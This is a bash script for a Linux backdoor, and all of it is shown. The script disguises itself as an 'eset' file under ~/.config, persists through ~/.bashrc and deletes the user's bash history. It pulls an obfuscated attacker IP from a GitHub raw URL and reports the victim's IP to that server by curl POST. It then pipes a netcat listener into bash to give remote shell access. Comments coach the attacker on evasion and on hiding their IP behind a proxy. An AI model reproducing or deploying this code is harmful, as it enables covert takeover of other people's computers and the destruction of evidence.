#!/usr/bin/env bash

VICTIM_PORT=2024
ATTACKER_PORT=2024
DEBUG_MODE="false"

# Frequency of sending response for
# victims presence (in seconds)
SLEEP_TIME=20

# GET ENCRYPTED IP FROM THIS LINK
URL="https://raw.githubusercontent.com/erucix/-/main/README.md"

# Get saved encoded IP from somewhere
# Keep it far from you and controllable
# by you since you might have a dynamic
# IP and might need to update your public
# ip(attacker's) for the infected victims
function get_ip {

  RESPONSE=`curl -s --fail $URL`

  if [ $? -ne 0 ]
  then
    echo "[!] Destination IP not provided."
    exit 1
  fi

  echo $RESPONSE
}


# Since we encode the IP by a simple
# number increment and put it in server
# so that finding you will be a bit hard
# here we need to subtract each no. from 1
#
# For 0 to 8 => -1
# For . do nothing
# For # replace with 9
function decode_ip {
  local NEW_IP=""

  IP=$1

  for (( i = 0; i<${#IP}; i++ )); do
    CURRENT_CHAR=${IP:$i:1}
    NEW_CHAR=""
  
    if [ $CURRENT_CHAR = "." ]
    then
      NEW_CHAR=$CURRENT_CHAR
    elif [ $CURRENT_CHAR = "#" ]
    then
      NEW_CHAR=9
    else
      NEW_CHAR=`expr $CURRENT_CHAR - 1`
    fi

    NEW_IP="${NEW_IP}${NEW_CHAR}"
  done

  echo $NEW_IP
}

# Open reverse shell in victim's device
# Since -e/-c is not available in nc
# but in ncat thus we can't use the 
# safe one so going with | bash
function open_reverse_shell {
  TRAFFIC_STATUS=`should_create_traffic`

  if [ $TRAFFIC_STATUS = "true" ]
  then
    nc -lnkp $VICTIM_PORT | $(/usr/bin/env bash)  > /dev/null 2>&1
  else
    sleep 10
    open_reverse_shell
  fi
}

# Since installation creates bash history
# we delete to reduce noise (shhhhh)
function delete_history {
  rm -rf ~/.bash_history
}

# Infecting a large device might be untrackable
# so they send their presence (ip) to you.
# Make sure your server is running with following
# directory structure
#
# / -> GET REQ (Your response should be YES/NO)
#      Will explain later why so
# /presence -> POST REQ (Victim send their presence here)
#
function send_presence {
  while true
  do
    TRAFFIC_STATUS=`should_create_traffic $1`

    if [ $TRAFFIC_STATUS = "true" ]
    then
      ATTACKER_IP=$1
      PRESENCE_RESPONSE=`curl -s --fail -X POST http://$ATTACKER_IP:$ATTACKER_PORT/presence -d $(hostname -I)`

      if [ ! $PRESENCE_RESPONSE = "ACK" ]
      then
        log "[+] Attacker server not available."
      fi

      sleep $SLEEP_TIME
    fi
  done
}

# Checks if the victim should create traffic or not
# to reduce unwanted noise and prevent unwanted shell access
# Creates traffic if you respond with anything other
# than "NO" or you dont respond at all (good thing)
# This is where '/' (POST REQ) comes in
function should_create_traffic {
  ATTACKER_IP=$1

  RESPONSE=`curl -s --fail http://$ATTACKER_IP:$ATTACKER_PORT`

  if [[ $RESPONSE = "NO" && $? -ne 0 ]]
  then
    echo "false"
  else
    echo "true"
  fi
}

# Check if shell is already running by doing
# a simple netcat scan at $VICTIM_PORT
function is_shell_running {
  nc -z localhost $VICTIM_PORT

  if [ $? = 0 ]
  then
    echo "true"
  else 
    echo "false"
  fi
}

# Installs script to ~/.config/eset/ and add itself
# to ~/.bashrc since i am lazy for crontab
function install_script {
  mkdir -p ~/.config/eset/
  mv eset.sh ~/.config/eset/
  
  chmod +x ~/.config/eset/eset.sh

  echo -e "\n~/.config/eset/eset.sh &" >> ~/.bashrc

  source ~/.bashrc
}

# Check if script is already installed
function check_if_installed {
  if [ -f ~/.config/eset/eset.sh ]
  then
    echo "true"
  else
    echo "false"
  fi
}

function log {
  if [ $DEBUG_MODE = "true" ]
  then
    echo "$1"
  fi
}

# Main entry point of program
function main {
  log "[+] Checking pre-installation"
  INSTALL_STATUS=`check_if_installed`
  sleep .2

  if [ $INSTALL_STATUS = "false" ]
  then
    log "[+] Beginning installation."
    install_script
    sleep .2

    log "[+] Installation done"
  fi

  log "[+] Deleting history"
  delete_history
  sleep .2

  log "[+] Checking if server is already running"
  SERVER_STATUS=`is_shell_running`
  sleep .2

  if [ $SERVER_STATUS = "true" ]
  then
    log "[+] Server is running so, I am exitting"
    exit 1
  fi

  log "[+] Fetching attacker encoded IP"
  ENCODED_IP=`get_ip`
  sleep .2

  log "[+] Decoding IP"
  DECODED_IP=`decode_ip $ENCODED_IP`
  sleep .2

  log "[+] Initiating presence sender"
  send_presence $DECODED_IP &
  sleep .2

  log "[+] Starting reverse shell server"
  open_reverse_shell
  sleep .2
}


# Before we run 'main' make sure that
# you use a proxy which will act as a
# middleware for you so you don't reveal
# your actual IP.
main